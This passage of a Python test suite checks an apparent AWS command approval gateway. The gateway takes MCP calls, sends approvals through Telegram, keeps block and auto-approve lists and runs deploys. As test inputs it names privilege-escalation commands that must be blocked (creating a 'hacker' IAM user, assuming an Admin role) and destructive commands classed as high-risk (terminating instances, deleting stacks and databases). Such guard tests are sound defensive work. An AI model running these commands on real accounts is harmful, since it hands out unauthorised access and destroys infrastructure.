            mcp_admin.DEFAULT_ACCOUNT_ID = original
    
    @patch('telegram.send_telegram_message')
    def test_mcp_tool_remove_account_not_exists(self, mock_telegram, app_module):
        """移除不存在的帳號"""
        with patch('accounts.get_account', return_value=None):
            result = app_module.mcp_tool_remove_account('test-1', {
                'account_id': '999999999999'
            })
            
            body = json.loads(result['body'])
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'error'
            assert '不存在' in content['error']


# ============================================================================
# Deployer MCP Tools 測試
# ============================================================================

class TestDeployerMCPTools:
    """Deployer MCP Tools 測試"""
    
    def test_mcp_tool_deploy_status_not_found(self, app_module):
        """查詢不存在的部署狀態"""
        with patch('deployer.get_deploy_status', return_value={'error': '部署記錄不存在'}):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test-1',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_deploy_status',
                        'arguments': {
                            'deploy_id': 'nonexistent'
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            content = json.loads(body['result']['content'][0]['text'])
            assert 'error' in content
    
    def test_mcp_tool_deploy_cancel_missing_id(self, app_module):
        """取消部署缺少 ID"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_deploy_cancel',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32602
    
    def test_mcp_tool_deploy_history_missing_project(self, app_module):
        """部署歷史缺少專案 ID"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_deploy_history',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32602
    
    def test_mcp_tool_deploy_missing_project(self, app_module):
        """部署缺少專案"""
        # 透過 deployer 模組直接呼叫
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        from deployer import mcp_tool_deploy
        
        with patch('deployer.get_project', return_value=None), \
             patch('deployer.list_projects', return_value=[]):
            result = mcp_tool_deploy('test-1', {
                'reason': 'test deploy'
            }, app_module.table, None)
            
            body = json.loads(result['body'])
            assert 'error' in body
        
        sys.path.pop(0)
    
    def test_mcp_tool_deploy_missing_reason(self, app_module):
        """部署缺少原因"""
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        from deployer import mcp_tool_deploy
        
        result = mcp_tool_deploy('test-1', {
            'project': 'test-project'
        }, app_module.table, None)
        
        body = json.loads(result['body'])
        assert 'error' in body
        
        sys.path.pop(0)


# ============================================================================
# REST API Handler 測試補充
# ============================================================================

class TestRESTAPIHandlerAdditional:
    """REST API Handler 補充測試"""
    
    def test_handle_clawdbot_request_missing_command(self, app_module):
        """缺少命令"""
        event = {
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'reason': 'test'
            })
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 400
    
    def test_handle_clawdbot_request_invalid_json(self, app_module):
        """無效 JSON"""
        event = {
            'headers': {'x-approval-secret': 'test-secret'},
            'body': 'not json'
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 400
    
    @patch('commands.execute_command')
    def test_handle_clawdbot_request_safelist(self, mock_execute, app_module):
        """REST API 自動批准"""
        mock_execute.return_value = '{"result": "ok"}'
        
        event = {
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws s3 ls'
            })
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        assert body['status'] == 'auto_approved'


# ============================================================================
# Telegram Commands 測試補充
# ============================================================================

class TestTelegramCommandsAdditional:
    """Telegram Commands 補充測試"""
    
    def test_handle_trust_command_empty(self, app_module):
        """/trust 命令沒有活躍時段"""
        with patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_trust_command('12345')
            assert result['statusCode'] == 200
    
    def test_handle_pending_command_with_items(self, app_module):
        """/pending 命令有待審批項目"""
        # 建立 pending 項目
        app_module.table.put_item(Item={
            'request_id': 'pending-cmd-test',
            'command': 'aws ec2 start-instances',
            'status': 'pending',
            'source': 'test',
            'created_at': int(time.time())
        })
        
        with patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_pending_command('999999999')
            assert result['statusCode'] == 200


# ============================================================================
# Helper Functions 測試補充
# ============================================================================

class TestHelperFunctionsAdditional:
    """Helper Functions 補充測試"""
    
    def test_generate_request_id(self, app_module):
        """產生請求 ID"""
        id1 = app_module.generate_request_id('aws s3 ls')
        id2 = app_module.generate_request_id('aws s3 ls')
        
        assert len(id1) == 12
        assert id1 != id2  # 應該每次產生不同的 ID
    
    def test_decimal_to_native_dict(self, app_module):
        """Decimal 轉換 - dict"""
        from decimal import Decimal
        data = {'count': Decimal('10'), 'value': Decimal('3.14')}
        result = app_module.decimal_to_native(data)
        assert result['count'] == 10
        assert result['value'] == 3.14
    
    def test_decimal_to_native_list(self, app_module):
        """Decimal 轉換 - list"""
        from decimal import Decimal
        data = [Decimal('1'), Decimal('2'), Decimal('3')]
        result = app_module.decimal_to_native(data)
        assert result == [1, 2, 3]
    
    def test_response_helper(self, app_module):
        """response 輔助函數"""
        result = app_module.response(200, {'test': 'data'})
        assert result['statusCode'] == 200
        assert 'Content-Type' in result['headers']
        body = json.loads(result['body'])
        assert body['test'] == 'data'


# ============================================================================
# Lambda Handler 路由測試
# ============================================================================

class TestLambdaHandlerRouting:
    """Lambda Handler 路由測試"""
    
    def test_handler_options_request(self, app_module):
        """OPTIONS 請求（CORS）"""
        event = {
            'httpMethod': 'OPTIONS',
            'path': '/',
            'headers': {}
        }
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
    
    def test_handler_mcp_path(self, app_module):
        """MCP 路徑路由"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test',
                'method': 'initialize'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
    
    def test_handler_webhook_path(self, app_module):
        """Webhook 路徑路由"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({}),
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200


# ============================================================================
# 補充 BLOCKED 命令測試
# ============================================================================

class TestBlockedCommands:
    """BLOCKED 命令測試"""
    
    def test_blocked_iam_create_user(self, app_module):
        """iam create-user 應該被封鎖"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws iam create-user --user-name hacker',
                        'trust_scope': 'test-session',
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'blocked'
    
    def test_blocked_sts_assume_role(self, app_module):
        """sts assume-role 應該被封鎖"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws sts assume-role --role-arn arn:aws:iam::123:role/Admin',
                        'trust_scope': 'test-session',
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'blocked'


# ============================================================================
# Execute Command 測試
# ============================================================================

class TestExecuteCommandAdditional:
    """Execute Command 測試"""
    
    def test_execute_non_aws_command(self, app_module):
        """非 AWS 命令應該被拒絕"""
        result = app_module.execute_command('ls -la')
        assert '只能執行 aws CLI 命令' in result
    
    def test_execute_invalid_command_format(self, app_module):
        """未配對引號不應 crash（aws_cli_split 容錯處理）"""
        result = app_module.execute_command('aws s3 ls "unclosed')
        # aws_cli_split 容錯：未配對引號視為字串結束
        # 命令會正常嘗試執行（可能 awscli 報錯，或找不到 awscli 模組）
        assert isinstance(result, str)


# ============================================================================
# Paged Output 測試補充
# ============================================================================

class TestPagedOutputAdditional:
    """Paged Output 補充測試"""
    
    def test_get_paged_output_invalid_format(self, app_module):
        """無效格式的 page_id"""
        result = app_module.get_paged_output('invalid-format')
        assert 'error' in result
    
    def test_store_paged_output_with_pages(self, app_module):
        """儲存需要分頁的輸出"""
        long_output = 'x' * 10000  # 超過 OUTPUT_MAX_INLINE
        result = app_module.store_paged_output('paged-test', long_output)
        
        assert result['paged'] == True
        assert result['total_pages'] >= 3


# ============================================================================
# Telegram Message 功能測試
# ============================================================================

class TestTelegramMessageFunctions:
    """Telegram Message 功能測試"""
    
    def test_send_approval_request(self, app_module):
        """發送審批請求"""
        with patch('telegram.send_telegram_message') as mock_send:
            app_module.send_approval_request(
                'test-req-123',
                'aws ec2 start-instances --instance-ids i-123',
                'Test reason',
                timeout=300,
                source='test-source',
                account_id='111111111111',
                account_name='Test Account'
            )
            mock_send.assert_called_once()
    
    def test_send_approval_request_dangerous(self, app_module):
        """發送高危命令審批請求"""
        with patch('telegram.send_telegram_message') as mock_send:
            app_module.send_approval_request(
                'test-req-456',
                'aws ec2 terminate-instances --instance-ids i-123',  # 高危
                'Test reason',
                timeout=300
            )
            mock_send.assert_called_once()


# ============================================================================
# Commands 模組補充測試
# ============================================================================

class TestCommandsModuleAdditional:
    """Commands 模組補充測試"""
    
    def test_is_blocked_iam_attach_policy(self, app_module):
        """attach policy 應該被封鎖"""
        from commands import is_blocked
        assert is_blocked('aws iam attach-user-policy --user-name test --policy-arn arn:xxx') is True
    
    def test_is_blocked_kms_create_key(self, app_module):
        """kms create-key 應該被封鎖"""
        from commands import is_blocked
        assert is_blocked('aws kms create-key') is True
    
    def test_is_auto_approve_get_caller_identity(self, app_module):
        """get-caller-identity 應該自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws sts get-caller-identity') is True
    
    def test_is_dangerous_cloudformation_delete(self, app_module):
        """cloudformation delete-stack 應該是高危"""
        from commands import is_dangerous
        assert is_dangerous('aws cloudformation delete-stack --stack-name test') is True
    
    def test_is_dangerous_rds_delete(self, app_module):
        """rds delete-db-instance 應該是高危"""
        from commands import is_dangerous
        assert is_dangerous('aws rds delete-db-instance --db-instance-identifier test') is True


# ============================================================================
# HMAC 驗證補充測試
# ============================================================================

class TestHMACVerificationAdditional:
    """HMAC 驗證補充測試"""
    
    def test_verify_hmac_expired_timestamp(self, app_module):
        """過期的 timestamp"""
        import time
        with patch.object(app_module, 'ENABLE_HMAC', True):
            headers = {
                'x-timestamp': str(int(time.time()) - 600),  # 10 分鐘前
                'x-nonce': 'test-nonce',
                'x-signature': 'invalid-sig'
            }
            result = app_module.verify_hmac(headers, 'body')
            assert result is False


# ============================================================================
# MCP Request Validation 測試
# ============================================================================

class TestMCPRequestValidation:
    """MCP Request 驗證測試"""
    
    def test_mcp_missing_method(self, app_module):
        """缺少 method"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        assert 'error' in body
    
    def test_mcp_invalid_body(self, app_module):
        """無效的 JSON body"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': 'not-json',
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        assert 'error' in body


# ============================================================================
# MCP Tools List 補充測試
# ============================================================================

class TestMCPToolsListAdditional:
    """MCP tools/list 補充測試"""
    
    def test_tools_list_contains_deploy_tools(self, app_module):
        """工具列表應包含部署工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test',
                'method': 'tools/list'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        tools = body['result']['tools']
        tool_names = [t['name'] for t in tools]
        
        assert 'bouncer_deploy' in tool_names
        assert 'bouncer_deploy_status' in tool_names


# ============================================================================
# Deployer 補充測試
# ============================================================================

class TestDeployerAdditional:
    """Deployer 模組補充測試"""
    
    @pytest.fixture
    def deployer_setup(self, mock_dynamodb):
        """設置 deployer 測試環境"""
        # Projects table
        mock_dynamodb.create_table(
            TableName='bouncer-projects',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # History table
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-history',
            KeySchema=[{'AttributeName': 'deploy_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[
                {'AttributeName': 'deploy_id', 'AttributeType': 'S'},
                {'AttributeName': 'project_id', 'AttributeType': 'S'},
                {'AttributeName': 'started_at', 'AttributeType': 'N'}
            ],
            GlobalSecondaryIndexes=[{
                'IndexName': 'project-time-index',
                'KeySchema': [
                    {'AttributeName': 'project_id', 'KeyType': 'HASH'},
                    {'AttributeName': 'started_at', 'KeyType': 'RANGE'}
                ],
                'Projection': {'ProjectionType': 'ALL'}
            }],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # Locks table
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-locks',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        return mock_dynamodb
    
    def test_get_project_not_exists(self, deployer_setup):
        """取得不存在的專案"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.projects_table = deployer_setup.Table('bouncer-projects')
        
        project = deployer.get_project('nonexistent')
        assert project is None
        
        sys.path.pop(0)
    
    def test_get_deploy_record_not_exists(self, deployer_setup):
        """取得不存在的部署記錄"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_setup.Table('bouncer-deploy-history')
        
        record = deployer.get_deploy_record('nonexistent')
        assert record is None
        
        sys.path.pop(0)


if __name__ == '__main__':
    pytest.main([__file__, '-v'])


# ============================================================================
# 額外覆蓋率測試
# ============================================================================

class TestAdditionalCoverage:
    """額外覆蓋率測試"""
    
    def test_mcp_method_ping(self, app_module):
        """ping 方法"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test',
                'method': 'ping'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
    
    def test_mcp_tools_call_list_safelist(self, app_module):
        """bouncer_list_safelist 工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_list_safelist',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert 'safelist_prefixes' in content
        assert 'blocked_patterns' in content
    
    def test_mcp_tools_call_list_accounts(self, app_module):
        """bouncer_list_accounts 工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_list_accounts',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert 'accounts' in content
        assert 'default_account' in content


class TestDeployerMCPToolsAdditional:
    """Deployer MCP Tools 補充測試"""
    
    def test_mcp_deploy_status_found(self, app_module):
        """部署狀態查詢 - 存在"""
        with patch('deployer.get_deploy_status', return_value={
            'deploy_id': 'test-deploy',
            'project_id': 'test-project',
            'status': 'RUNNING'
        }):
            event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 'test',
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_deploy_status',
                        'arguments': {
                            'deploy_id': 'test-deploy'
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            content = json.loads(body['result']['content'][0]['text'])
            assert 'deploy_id' in content


# ============================================================================
# Paging 模組完整測試
# ============================================================================

class TestPagingModuleFull:
    """Paging 模組完整測試"""
    
    def test_store_paged_output_multiple_pages(self, app_module):
        """儲存多頁輸出"""
        # 建立需要分成多頁的長輸出
        long_output = 'A' * 3500 + 'B' * 3500 + 'C' * 3500  # 約 10500 字元
        result = app_module.store_paged_output('multi-page-test', long_output)
        
        assert result['paged'] == True
        assert result['total_pages'] >= 3
        assert result['page'] == 1
        assert result['next_page'] == 'multi-page-test:page:2'
    
    def test_get_paged_output_success(self, app_module):
        """成功取得分頁"""
        # 先存一個分頁
        app_module.table.put_item(Item={
            'request_id': 'page-get-test:page:2',
            'content': 'Page 2 content',
            'page': 2,
            'total_pages': 3,
            'original_request': 'page-get-test'
        })
        
        result = app_module.get_paged_output('page-get-test:page:2')
        
        assert 'error' not in result
        assert result['page'] == 2
        assert result['total_pages'] == 3
        assert result['result'] == 'Page 2 content'
        assert result['next_page'] == 'page-get-test:page:3'
    
    def test_get_paged_output_last_page(self, app_module):
        """取得最後一頁（沒有 next_page）"""
        app_module.table.put_item(Item={
            'request_id': 'last-page-test:page:3',
            'content': 'Last page',
            'page': 3,
            'total_pages': 3,
            'original_request': 'last-page-test'
        })
        
        result = app_module.get_paged_output('last-page-test:page:3')
        
        assert result['page'] == 3
        assert result['next_page'] is None


# ============================================================================
# Telegram 模組完整測試
# ============================================================================

class TestTelegramModuleFull:
    """Telegram 模組完整測試"""
    
    def test_send_telegram_message(self, app_module):
        """發送 Telegram 訊息"""
        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = b'{"ok": true}'
            mock_urlopen.return_value.__enter__ = MagicMock(return_value=mock_response)
            mock_urlopen.return_value.__exit__ = MagicMock(return_value=False)
            
            # 直接呼叫 telegram 模組的函數
            from telegram import send_telegram_message
            send_telegram_message('Test message')
            
            mock_urlopen.assert_called()
    
    def test_update_message(self, app_module):
        """更新 Telegram 訊息"""
        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = b'{"ok": true}'
            mock_urlopen.return_value.__enter__ = MagicMock(return_value=mock_response)
            mock_urlopen.return_value.__exit__ = MagicMock(return_value=False)
            
            app_module.update_message(123, 'Updated text')
            mock_urlopen.assert_called()
    
    def test_answer_callback(self, app_module):
        """回答 callback query"""
        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_response = MagicMock()
            mock_response.read.return_value = b'{"ok": true}'
            mock_urlopen.return_value.__enter__ = MagicMock(return_value=mock_response)
            mock_urlopen.return_value.__exit__ = MagicMock(return_value=False)
            
            app_module.answer_callback('cb123', 'Done!')
            mock_urlopen.assert_called()


# ============================================================================
# Trust 模組完整測試
# ============================================================================

class TestTrustModuleFull:
    """Trust 模組完整測試"""
    
    def test_increment_trust_command_count(self, app_module):
        """增加信任命令計數"""
        # 先建立信任時段
        trust_id = app_module.create_trust_session('count-test', '111111111111', '999999999')
        
        # 增加計數
        new_count = app_module.increment_trust_command_count(trust_id)
        assert new_count == 1
        
        # 再增加
        new_count = app_module.increment_trust_command_count(trust_id)
        assert new_count == 2
    
    def test_should_trust_approve_excluded_iam(self, app_module):
        """IAM 命令不應被信任批准"""
        # 建立信任時段
        source = 'iam-test-source'
        app_module.create_trust_session(source, '111111111111', '999999999')
        
        # IAM 命令不應被信任
        should_trust, session, reason = app_module.should_trust_approve(
            'aws iam list-users',
            source,
            '111111111111'
        )
        assert should_trust is False


# ============================================================================
# Rate Limit 完整測試
# ============================================================================

class TestRateLimitFull:
    """Rate Limit 完整測試"""
    
    def test_check_rate_limit_first_request(self, app_module):
        """第一次請求不應被限制"""
        import uuid
        source = f'rate-limit-test-{uuid.uuid4()}'
        
        # 不應拋出異常
        app_module.check_rate_limit(source)
    
    def test_check_rate_limit_none_source(self, app_module):
        """None source 應該跳過檢查"""
        # 不應拋出異常
        app_module.check_rate_limit(None)


# ============================================================================
# Deployer 完整測試
# ============================================================================

class TestDeployerFull:
    """Deployer 完整測試"""
    
    @pytest.fixture
    def deployer_full_setup(self, mock_dynamodb):
        """完整設置 deployer 測試環境"""
        # Projects table
        mock_dynamodb.create_table(
            TableName='bouncer-projects',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # History table
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-history',
            KeySchema=[{'AttributeName': 'deploy_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[
                {'AttributeName': 'deploy_id', 'AttributeType': 'S'},
                {'AttributeName': 'project_id', 'AttributeType': 'S'},
                {'AttributeName': 'started_at', 'AttributeType': 'N'}
            ],
            GlobalSecondaryIndexes=[{
                'IndexName': 'project-time-index',
                'KeySchema': [
                    {'AttributeName': 'project_id', 'KeyType': 'HASH'},
                    {'AttributeName': 'started_at', 'KeyType': 'RANGE'}
                ],
                'Projection': {'ProjectionType': 'ALL'}
            }],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # Locks table
        mock_dynamodb.create_table(
            TableName='bouncer-deploy-locks',
            KeySchema=[{'AttributeName': 'project_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'project_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        return mock_dynamodb
    
    def test_cancel_deploy_running(self, deployer_full_setup):
        """取消正在執行的部署"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_full_setup.Table('bouncer-deploy-history')
        deployer.locks_table = deployer_full_setup.Table('bouncer-deploy-locks')
        
        # 建立執行中的記錄
        deployer.history_table.put_item(Item={
            'deploy_id': 'running-deploy',
            'project_id': 'test-project',
            'status': 'RUNNING'
        })
        
        # 取消
        with patch.object(deployer, 'sfn_client') as mock_sfn:
            result = deployer.cancel_deploy('running-deploy')
            assert result['status'] == 'cancelled'
        
        sys.path.pop(0)
    
    def test_update_deploy_record(self, deployer_full_setup):
        """更新部署記錄"""
        import sys
        if 'deployer' in sys.modules:
            del sys.modules['deployer']
        if 'src.deployer' in sys.modules:
            del sys.modules['src.deployer']
        
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
        import deployer
        
        deployer.history_table = deployer_full_setup.Table('bouncer-deploy-history')
        
        # 建立記錄
        deployer.history_table.put_item(Item={
            'deploy_id': 'update-test',
            'project_id': 'test',
            'status': 'PENDING'
        })
        
        # 更新
        deployer.update_deploy_record('update-test', {
            'status': 'RUNNING',
            'execution_arn': 'arn:aws:states:...'
        })
        
        # 驗證
        item = deployer.history_table.get_item(Key={'deploy_id': 'update-test'})['Item']
        assert item['status'] == 'RUNNING'
        
        sys.path.pop(0)


# ============================================================================
# Commands 模組完整測試
# ============================================================================

class TestCommandsModuleFull:
    """Commands 模組完整測試"""
    
    def test_aws_cli_split_nested_json(self, app_module):
        """巢狀 JSON 正確解析"""
        cmd = 'aws dynamodb put-item --table-name test --item {"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}'
        result = app_module.aws_cli_split(cmd)
        json_idx = result.index('--item') + 1
        assert result[json_idx] == '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}'
    
    def test_is_auto_approve_dynamodb_operations(self, app_module):
        """DynamoDB 讀取操作自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws dynamodb scan --table-name test') is True
        assert is_auto_approve('aws dynamodb query --table-name test') is True
        assert is_auto_approve('aws dynamodb get-item --table-name test') is True
    
    def test_is_blocked_organizations(self, app_module):
        """organizations 命令應該被封鎖"""
        from commands import is_blocked
        assert is_blocked('aws organizations list-accounts') is True


# ============================================================================
# App 模組 - Callback Handlers 補充
# ============================================================================

class TestCallbackHandlersFull:
    """Callback Handlers 完整測試"""
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_deny_command(self, mock_update, mock_answer, app_module):
        """拒絕命令執行"""
        request_id = 'deny-cmd-test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 terminate-instances --instance-ids i-123',
            'status': 'pending_approval',
            'source': 'test',
            'reason': 'test',
            'account_id': '111111111111',
            'account_name': 'Test',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_deploy_deny(self, mock_update, mock_answer, app_module):
        """拒絕部署"""
        request_id = 'deploy-deny-test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'deploy',
            'project_id': 'test-project',
            'project_name': 'Test Project',
            'branch': 'main',
            'stack_name': 'test-stack',
            'status': 'pending_approval',
            'source': 'test',
            'reason': 'test deploy',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    @patch('deployer.start_deploy')
    def test_callback_deploy_approve(self, mock_start, mock_update, mock_answer, app_module):
        """批准部署"""
        mock_start.return_value = {'status': 'started', 'deploy_id': 'deploy-123'}
        
        request_id = 'deploy-approve-test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'action': 'deploy',
            'project_id': 'test-project',
            'project_name': 'Test Project',
            'branch': 'main',
            'stack_name': 'test-stack',
            'status': 'pending_approval',
            'source': 'test',
            'reason': 'test deploy',
            'ttl': int(time.time()) + 300
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200


# ============================================================================
# Accounts 模組完整測試
# ============================================================================

class TestAccountsModuleFull:
    """Accounts 模組完整測試"""
    
    def test_list_accounts_empty(self, app_module):
        """列出帳號（空）"""
        accounts = app_module.list_accounts()
        # 可能為空或有預設帳號
        assert isinstance(accounts, list)
    
    def test_init_default_account(self, app_module):
        """初始化預設帳號"""
        # 呼叫不應出錯
        app_module.init_default_account()


# ============================================================================
# MCP Tool - Add Account 完整測試  
# ============================================================================

class TestMCPAddAccountFull:
    """MCP Add Account 完整測試"""
    
    @patch('telegram.send_telegram_message')
    def test_add_account_success_async(self, mock_telegram, app_module):
        """新增帳號成功（異步）"""
        result = app_module.mcp_tool_add_account('test-1', {
            'account_id': '222222222222',
            'name': 'New Account',
            'role_arn': 'arn:aws:iam::222222222222:role/TestRole',
            'async': True
        })
        
        body = json.loads(result['body'])
